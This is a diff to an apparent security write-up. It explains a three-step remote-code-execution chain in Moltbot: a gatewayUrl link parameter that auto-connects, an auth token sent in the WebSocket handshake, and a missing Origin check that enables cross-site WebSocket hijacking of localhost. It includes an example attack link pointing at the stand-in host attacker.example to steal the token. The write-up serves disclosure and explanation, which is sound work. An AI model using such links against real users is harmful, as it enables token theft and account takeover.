@@ -25,7 +25,13 @@ This RCE is a chain of three seemingly harmless design decisions:
 3. **Connections include the auth token**  
    The WebSocket handshake automatically includes your authentication token. Standard practice — otherwise how would the gateway know who you are?
 
-Now chain these three "reasonable designs" together: An attacker sends you a link like `http://your-moltbot.com?gatewayUrl=ws://attacker.com:8080`. You click it, the app auto-connects to the attacker's fake gateway, and your auth token gets handed over.
+Now chain these three "reasonable designs" together: an attacker sends you a link like:
+
+```text
+example.invalid/?gatewayUrl=ws://attacker.example:8080
+```
+
+You click it, the app auto-connects to the attacker’s fake gateway, and your auth token gets handed over.
 
 That's just step one.
 
@@ -33,7 +39,13 @@ That's just step one.
 
 Most people run Moltbot on localhost, which should theoretically be unreachable from the outside. But the attacker found another issue: **Moltbot's WebSocket server doesn't validate the Origin header**.
 
-This means that just by visiting the attacker's website `attacker.com`, they can run JavaScript in your browser that opens a WebSocket connection to `ws://localhost:18789`, then logs in to your local Moltbot using the stolen token.
+This means that just by visiting the attacker’s website `attacker.com`, they can run JavaScript in your browser that opens a WebSocket connection to:
+
+```text
+ws://localhost:18789
+```
+
+…and then log in to your local Moltbot using the stolen token.
 
 It's called Cross-Site WebSocket Hijacking (CSWSH). Not a new trick, but effective.
 
